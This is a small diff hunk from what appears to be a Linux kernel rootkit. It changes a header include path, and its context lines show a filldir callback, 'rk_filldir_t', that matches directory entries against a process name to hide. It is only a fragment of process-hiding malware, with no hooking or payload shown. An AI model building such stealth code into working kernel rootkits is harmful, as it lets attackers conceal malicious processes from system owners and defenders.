@@ -1,5 +1,5 @@
 
-#include "proc.h"
+#include "./headers/proc.h"
 static int rk_filldir_t(struct dir_context* ctx, const char* proc_name, int len, loff_t off, u64 ino, unsigned intd_type)
 {
     if (strncmp(proc_name, proc_to_hide, strlen(proc_to_hide)) == 0)
